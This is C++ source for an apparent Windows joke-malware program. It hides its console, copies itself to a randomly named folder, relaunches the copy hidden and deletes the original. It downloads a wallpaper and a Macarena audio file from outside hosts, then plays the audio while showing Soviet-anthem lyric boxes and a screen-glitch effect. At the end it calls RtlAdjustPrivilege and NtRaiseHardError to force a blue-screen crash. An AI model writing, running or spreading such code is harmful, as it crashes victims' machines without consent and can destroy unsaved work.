#include <windows.h>
#include <assert.h>
#include <iostream>
#include <shlobj.h>
#include <time.h>
#include <cstdlib>
#include <stdio.h>
#include <io.h>
#include <string>
#include <sstream>
#include <thread>
#include <tlhelp32.h>
#include <strsafe.h>
#include <filesystem>
#include <vector>
#include <cassert>
#include <map>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "winmm")
#pragma comment(lib, "ntdll.lib");

#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

/*
     Wallpaper -> 303791
     Macarena -> 40739508
*/
std::string executable_name()
{
#if defined(PLATFORM_POSIX) || defined(__linux__) //check defines for your setup

    std::string sp;
    std::ifstream("/proc/self/comm") >> sp;
    return sp;

#elif defined(_WIN32)

    char buf[MAX_PATH];
    GetModuleFileNameA(nullptr, buf, MAX_PATH);
    return buf;

#else

    static_assert(false, "unrecognized platform");

#endif
}

namespace std {
    LPWSTR toLPWSTR(std::string instr) {
        int bufferlen = ::MultiByteToWideChar(CP_ACP, 0, instr.c_str(), instr.size(), NULL, 0);
        if (bufferlen == 0)
        {
            return 0;
        }
        LPWSTR widestr = new WCHAR[bufferlen + 1];
        ::MultiByteToWideChar(CP_ACP, 0, instr.c_str(), instr.size(), widestr, bufferlen);
        widestr[bufferlen] = 0;
        return widestr;
    }
    inline std::wstring toWSTRING(std::string& s) {
        return std::wstring(s.begin(), s.end());
    }
    inline int rand(int x0, int x1) {
        return rand() % (x1 - x0) + x0;
    }
    int rand(int x) {
        std::string num = "";
        for (int i = 0; i < x; i++)
            num += std::to_string(std::rand(0,10));
        return std::stoi(num);
    }
}
namespace fileUtils {
    inline bool file_exists(const std::string& name) {
        struct stat buffer;
        return (stat(name.c_str(), &buffer) == 0);
    }
    long file_size(std::string filename)
    {
        struct stat stat_buf;
        int rc = stat(filename.c_str(), &stat_buf);
        return rc == 0 ? stat_buf.st_size : -1;
    }
    BOOL file_check(std::string file, long size) {
        if (file_exists(file) && size == file_size(file))
            return 1;
        return 0;
    }
}
namespace Memory {
    BOOL isProcessOpen(std::wstring name) {
        std::vector<DWORD> pids;
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //all processes

        PROCESSENTRY32W entry; //current process
        entry.dwSize = sizeof entry;

        if (!Process32FirstW(snap, &entry)) { //start with the first in snapshot
            return 0;
        }

        do {
            if (std::wstring(entry.szExeFile) == name) {
                pids.emplace_back(entry.th32ProcessID); //name matches; add to list
            }
        } while (Process32NextW(snap, &entry));

        return (pids.size() != 0);
    }
}
namespace Payloads {
    std::vector<std::thread> payloadCoroutine;

    BOOL screen_bug = 0;
    void SCREEN_BUG() {
        int inc = 0;
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        while (1) {
            if (screen_bug) {
                inc++;
                int x = rand() % (sw - 0);
                int w = rand() % (5 - 0);
                int y = inc;
                HDC hdc = GetDC(HWND_DESKTOP);
                BitBlt(hdc, x, y, w, sw, hdc, x, 0, SRCCOPY);
                Sleep(100);
                if (inc > 500)
                    inc = 0;
            }
        }
    }

    void init() {
        payloadCoroutine.push_back(std::thread(SCREEN_BUG));
    }
}
std::wstring s2ws(const std::string& s)
{
    int len;
    int slength = (int)s.length() + 1;
    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
    wchar_t* buf = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
    std::wstring r(buf);
    delete[] buf;
    return r;
}

std::string wallpaper = "\\mauriescalboxdddddddCALBISIE.png";
std::string soundThing = "\\yathusableeeemfskfmdsl.wav";

BOOL isMacarenaPlaying = 0;
std::vector<std::thread> coroutine;
std::string yunno = "C:\\Calbus-" + std::to_string(std::rand(8));

void playMacarena() {
    isMacarenaPlaying = 1;
    std::string soundPath = yunno + soundThing;
    PlaySound(std::toLPWSTR(soundPath), NULL, SND_SYNC);
    isMacarenaPlaying = 0;
}
int uKnow = 0;
namespace Lyrics {
    std::map<int, LPCSTR> songLyrics;
    LPCSTR lyric = NULL;
    void coroutineLyricsBox() {
        MessageBoxA(GetForegroundWindow(), lyric, "Lyrics", NULL);
    }
    inline void lyricsBox(std::string lyrics) {
        coroutine.push_back(std::thread(&coroutineLyricsBox));
    }
    BOOL doesLyricsExists(int x0) {
        if (songLyrics.find(x0) != songLyrics.end())
            return 1;
        return 0;
    }
    void addLyric(int x0, LPCSTR x1) {
        if (!doesLyricsExists(x0))
            songLyrics[x0] = x1;
    }
    void doLyric(int x0) {

        if (doesLyricsExists(x0 - 1)) {
            lyric = songLyrics[x0 - 1];
            lyricsBox(songLyrics[x0 - 1]);
        }
    }
    void initLyrics() {
        addLyric(0, "Enjoy USSR Anthem1!11!!111!!!!");
        addLyric(118, "Soyuz nerushimy respublik svobodnykh");
        addLyric(180, "Splotila naveki velikaya Rus'!");
        addLyric(255, "Da zdravstvuyet sozdanny volley narodov");
        addLyric(320, "Yediny, moguchy Sovetsky soyuz!");
        addLyric(460, "Slav'sya, Otechestvo nashe svobodnoye,");
        addLyric(650, "I won't add more lyric...");
        addLyric(655, "I won't add more lyric...");
        addLyric(700, "I won't add more lyric...");
        addLyric(701, "I won't add more lyric...");
        addLyric(702, "I won't add more lyric...");
        addLyric(703, "I won't add more lyric...");
    }
}

int main(int argc, char* argv[], char* envp[])
{
    Payloads::init();
    Lyrics::initLyrics();
    std::thread currentThread;
    FreeConsole();
    std::string yunno_cmd = "md " + yunno;
    std::string yunno_exec = yunno + "\\executable_xd.exe";

    system(yunno_cmd.c_str());
    if (executable_name() != yunno_exec) {
        CopyFileA(executable_name().c_str(), yunno_exec.c_str() , 0);
        std::string sysDel = yunno_exec + " yes \"" + executable_name() + "\"";
        STARTUPINFO si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        std::wstring lvi = s2ws(sysDel);
        const wchar_t* cwChar = lvi.c_str();
        wchar_t* wChar = (wchar_t*)cwChar;
        CreateProcessW(NULL, wChar, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        return 0;
    }
    if (argc != 3)
        return 0;
    if (!strstr(argv[1], "yes"))
        return 0;
    while (!DeleteFileA(argv[2])) Sleep(20);
    /* Download required files for running. */
    LPCSTR wpDlWebsite = "https://i.imgur.com/mtl15AR.png";
    Sleep(50);
    std::string wpStr = yunno + wallpaper;
    URLDownloadToFileA(NULL, wpDlWebsite, wpStr.c_str(), 0, NULL);
    wpDlWebsite = "https://celebratory-motor.000webhostapp.com/macarena/videoplayback.wav";
    Sleep(50);
    std::string sndStr = yunno + soundThing;
    URLDownloadToFileA(NULL, wpDlWebsite, sndStr.c_str(), 0, NULL);
    Sleep(100);
    currentThread = std::thread(playMacarena);
    std::string wpPath = yunno + wallpaper;
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, std::toLPWSTR(wpPath), SPIF_UPDATEINIFILE);

    while (isMacarenaPlaying) {
        Lyrics::doLyric(uKnow);
        const char* uKnowChar = std::to_string(uKnow).c_str();
        Payloads::screen_bug = 1;
        uKnow++;
        Sleep(100);
    }
    Sleep(1000);
    Lyrics::lyricsBox("5"); /* TODO: Make those numbers work. */
    Sleep(1000);
    Lyrics::lyricsBox("4");
    Sleep(1000);
    Lyrics::lyricsBox("3");
    Sleep(1000);
    Lyrics::lyricsBox("2");
    Sleep(1000);
    Lyrics::lyricsBox("1");
    Sleep(1000);
    /* BSOD */ 
    BOOLEAN bl = NULL;
    ULONG response;
    RtlAdjustPrivilege(19, 1, 0, &bl);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
    return 0;
}
